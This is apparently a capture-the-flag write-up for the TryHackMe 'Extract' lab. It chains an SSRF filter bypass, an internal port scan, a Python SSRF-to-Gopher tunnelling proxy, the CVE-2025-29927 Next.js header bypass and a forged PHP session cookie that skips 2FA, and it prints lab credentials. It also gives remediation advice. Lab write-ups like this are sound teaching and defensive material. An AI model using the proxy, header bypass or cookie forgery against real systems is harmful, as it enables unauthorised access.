@@ -1,0 +1,261 @@
+```
+╔══════════════════════════════════════════════════╗
+║   TryHackMe — Extract Room Writeup               ║
+║   Author: Mahaveer Bhatt (R0x08 )                ║
+╚══════════════════════════════════════════════════╝
+```
+Medium Link : https://medium.com/@mahaveerbhat8206/tryhackme-extract-writeup-1c67322d9e67?sharedUserId=mahaveerbhat8206
+# TryHackMe — Extract Room Writeup
+
+**Target:** `10.48.150.125`
+**Application:** TryBookMe (Online Library)
+**Vulnerabilities chained:** SSRF via `preview.php` → internal port scan → Gopher-tunneled SSRF → CVE-2025-29927 (Next.js middleware auth bypass) → PHP session cookie (2FA flag) tampering
+
+---
+
+## 1. Reconnaissance
+
+### Nmap
+
+```
+nmap -sC -sV -v -p- 10.48.150.125
+```
+
+Open ports: `22/tcp` (SSH), `80/tcp` (HTTP). Nothing unusual at the network layer — the interesting surface is entirely in the web app.
+
+### Source review
+
+The app (`TryBookMe - Online Library`) is a static Bootstrap page listing PDFs. Each "Preview" link calls:
+
+```js
+function openPdf(url) {
+  const iframe = document.getElementById('pdfFrame');
+  iframe.src = 'preview.php?url=' + encodeURIComponent(url);
+  iframe.style.display = 'block';
+}
+```
+
+`preview.php?url=` takes a fully attacker-controlled URL and fetches it server-side to render in an iframe. That is the entire attack surface of this box — everything below is built on this one parameter.
+
+### Directory enumeration
+
+```
+ffuf -u 'http://10.48.150.125/FUZZ' \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
+  -mc all -t 100 -ic -fc 404 -e .php
+```
+
+| Path | Status |
+|---|---|
+| `/` (index.php) | 200 |
+| `/preview.php` | 200 (19B empty response without a `url` param) |
+| `/management/` | 301 |
+| `/pdf/` | 301 |
+| `/javascript/` | 301 |
+
+`dirsearch` confirmed the same three directories (`/pdf`, `/management`, `/javascript`). `/management/` is the one worth coming back to later — it's what Flag 2 lives behind.
+
+---
+
+## 2. SSRF Confirmation and Filter Mapping
+
+Before reaching for exploit tooling, I mapped out exactly what the `url` parameter blocks and allows, because guessing blindly wastes time.
+
+**Blocked (confirmed by error message `URL blocked due to keyword: <X>`):**
+- `file://` — blocked on the literal substring `file:/`
+- `php://` — blocked on the literal substring `php://` (also tried `PHP://` for a case bypass — still blocked, meaning the check lowercases input first)
+- `localhost` — blocked as a keyword, not an IP check
+
+**Bypass attempts that did *not* work** (worth recording — a writeup that only shows the winning path hides how much of real pentesting is elimination):
+- Double URL-encoding the `php://` wrapper (`php%253A%252F%252F...`) — request went through but returned nothing usable; the app doesn't appear to double-decode before filtering, so this bypass didn't apply here.
+- `compress.zlib://` and `compress.bzip2://` wrappers, and `glob://` for directory listing — untested further once the SSRF-to-internal-host path (below) proved more productive. Worth revisiting if a box blocks that route instead.
+
+**Allowed (the actual way in):**
+- `http://127.0.0.1/` → 200, returns the same 1735-byte app (confirms SSRF reaches localhost)
+- `http://0.0.0.0/` → same result
+- `http://cvssm1/` → the box's own hostname, also reachable
+
+The filter is a keyword blocklist on scheme/host strings, not an IP-range or SSRF-aware proxy block. It stops local-file-read wrappers but does nothing to stop the server from making arbitrary **HTTP** requests to itself — which is all that's actually needed here.
+
+---
+
+## 3. Internal Port Scan via SSRF
+
+Since `preview.php` will happily fetch `http://127.0.0.1:<port>/`, it can be used as a port scanner by fuzzing the port number and reading response size/status:
+
+```
+ffuf -u 'http://10.48.150.125/preview.php?url=http://127.0.0.1:FUZZ/' \
+  -w <(seq 1 65535) -mc all -t 100 -fs 0
+```
+
+**Results:**
+
+| Port | Size | Service |
+|---|---|---|
+| 80 | 1735B | The public TryBookMe app (reachable from outside too) |
+| 10000 | 6131B | An internal-only Next.js API, not exposed externally |
+
+Port 10000 is the target — it's not reachable directly from outside the box, only through the SSRF.
+
+---
+
+## 4. Gopher Proxy — Turning SSRF Into a Usable Tunnel
+
+A browser (or Burp) can't be pointed at `preview.php?url=gopher://...` directly in a useful way, and manually hand-crafting every request through SSRF is painful. The fix: a local proxy that accepts normal HTTP traffic on `127.0.0.1:5000`, wraps whatever it receives into a `gopher://` payload, and forwards it through `preview.php`. Gopher is used here purely as a "raw TCP over a URL scheme" trick — it lets the SSRF fetch arbitrary bytes against an arbitrary internal port, which is how HTTP requests to port 10000 and port 80's restricted `/management/` get smuggled through.
+
+```python
+#!/usr/bin/env python3
+import socket, sys, requests, urllib.parse, threading
+
+LHOST = '127.0.0.1'
+LPORT = 5000
+TARGET_HOST = "10.48.150.125"
+HOST_TO_PROXY = "127.0.0.1"
+PORT_TO_PROXY = 10000  # swap to 80 for flag 2
+
+def handle_client(conn, addr):
+    with conn:
+        data = conn.recv(65536)
+        double_encoded = urllib.parse.quote(urllib.parse.quote(data))
+        url = (f"http://{TARGET_HOST}/preview.php?url="
+               f"gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded}")
+        try:
+            resp = requests.get(url, timeout=15)
+            conn.sendall(resp.content)
+        except requests.RequestException as e:
+            print(f"[!] {e}")
+
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((LHOST, LPORT))
+        s.listen()
+        print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY}...")
+        while True:
+            conn, addr = s.accept()
+            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+
+if __name__ == "__main__":
+    main()
+```
+
+Double-URL-encoding the raw request bytes is necessary because the data passes through two decode layers before it reaches the gopher payload: the web server's own query-string decode, then whatever `preview.php` does internally before issuing the fetch. Single-encoding gets eaten by the first layer and arrives at the target mangled.
+
+Run it, point Burp/browser at `127.0.0.1:5000`, confirm the tunnel is alive:
+
+```
+python3 proxy.py
+curl http://127.0.0.1:5000/
+# -> "Unauthorised access to this system is strictly prohibited."
+```
+
+That response matched the internal Next.js app on port 10000, confirming the tunnel works end-to-end before spending time on the actual exploit.
+
+---
+
+## 5. Flag 1 — CVE-2025-29927 (Next.js Middleware Authorization Bypass)
+
+### The vulnerability
+
+Next.js middleware (used for things like auth checks before a request reaches a page) runs as part of the routing layer. CVE-2025-29927 affects versions where the framework trusts an internal header, `x-middleware-subrequest`, as a signal meaning *"this request is an internal rewrite Next.js generated for itself — skip re-running middleware on it, to avoid infinite loops."* Because that header is only meant to be set by Next.js internally, affected versions never validate that it actually came from the server and not from the client. Setting it on an external request convinces the framework the middleware (where the auth check lives) has already run, so it skips straight to the protected route.
+
+### Exploiting it
+
+The internal app on port 10000 gates `/customapi` behind this middleware. Through the gopher proxy (pointed at port 10000):
+
+```http
+GET /customapi HTTP/1.1
+Host: 127.0.0.1:5000
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+```
+
+(The repeated `middleware:` segments match the internal path Next.js uses to track nested middleware invocations in the vulnerable versions — a single value doesn't always trigger it, repeating it does.)
+
+**Response (relevant excerpt):**
+
+```
+This API is currently under maintenance. Please use the library portal to
+add new books using librarian:L1br4r1AN!!
+
+First flag is THM{***REDACTED***}
+```
+
+**Flag 1:** `THM{***REDACTED***}`
+**Credentials recovered:** `librarian:L1br4r1AN!!`
+
+---
+
+## 6. Flag 2 — Management Portal + 2FA Flag Tampering
+
+### Reaching `/management/`
+
+`/management/` on port 80 is restricted to localhost-only requests. Switching the gopher proxy to target port 80 instead of 10000 and browsing to `http://127.0.0.1:5000/management/` routes the request through the SSRF, which *is* localhost from the server's perspective — so the restriction is bypassed the same way as the port 10000 access.
+
+### Login and session cookie
+
+`POST /management/` with `librarian:L1br4r1AN!!` succeeds and returns:
+
+```
+Set-Cookie: auth_token=<url-encoded, PHP-serialized value>; Max-Age=3600; path=/
+Location: 2fa.php
+```
+
+URL-decoded, the cookie is PHP's native serialization format — **not JSON** (an earlier draft of this writeup mislabeled it as JSON, which was wrong — PHP's `serialize()` output has its own syntax: `type:length:"value";`):
+
+```
+O:9:"AuthToken":1:{s:9:"validated";b:0;}
+```
+
+Read left to right: an object (`O`) named `AuthToken` with 1 property; the property `validated` (a 9-character string, `s:9`) is a boolean (`b`) set to `0` (false). In plain terms: a session exists, but the 2FA step hasn't been completed yet.
+
+### Forging `validated`
+
+The application trusts this cookie's contents instead of tracking 2FA state server-side. Flipping `b:0` to `b:1` in the cookie value, re-encoding it, and replaying it against `/2fa.php` tells the server the user already passed 2FA — because nothing on the server actually checks that this is true:
+
+```http
+GET /management/2fa.php HTTP/1.1
+Host: 127.0.0.1:5000
+Cookie: auth_token=<same token with b:0 changed to b:1>
+```
+
+**Response:**
+
+```html
+<div class="alert alert-success text-center">
+  <h4 class="alert-heading">Congratulations!</h4>
+  <p>Here's the second flag: THM{***REDACTED***}</p>
+</div>
+```
+
+**Flag 2:** `THM{***REDACTED***}`
+
+---
+
+## 7. Root Cause and Remediation
+
+| Issue | Root cause | Fix |
+|---|---|---|
+| SSRF in `preview.php` | User input used directly as a fetch target, filtered only by a substring blocklist | Allowlist expected domains/schemes; never let user input reach an outbound request directly |
+| Internal port scan / gopher tunnel | SSRF had no network-level containment — the web server itself could reach internal-only ports | Network segmentation: the app server should not be able to route to internal management ports at all |
+| CVE-2025-29927 | Next.js trusted a client-settable header (`x-middleware-subrequest`) as proof of an internal-only call | Patch to a fixed Next.js version; never let internal control-flow signals be set by untrusted input |
+| 2FA bypass via cookie | 2FA completion state stored client-side and trusted as-is, with no signature/integrity check | Store session/auth state server-side (or sign and verify it, e.g. with an HMAC) so the client can't forge it |
+
+---
+
+## 8. Summary
+
+| Step | Technique | Result |
+|---|---|---|
+| Recon | `ffuf` / `dirsearch` | Found `preview.php`, `/management/` |
+| SSRF mapping | Blocklist testing on `url` param | Identified `file://`/`php://`/`localhost` blocked, raw HTTP to `127.0.0.1` allowed |
+| Port scan | `preview.php` as a proxy for `ffuf` | Found internal ports 80 and 10000 |
+| Tunnel | Custom Python SSRF-to-Gopher proxy | Full HTTP access to internal-only services |
+| Flag 1 | CVE-2025-29927 middleware bypass | Recovered credentials + Flag 1 |
+| Flag 2 | PHP-serialized cookie tampering (2FA bypass) | Flag 2 |
+
+## Tools Used
+
+- `nmap`, `ffuf`, `dirsearch` — recon
+- Burp Suite — request interception/manipulation
+- Custom Python SSRF-to-Gopher proxy
+- Manual PHP serialization analysis
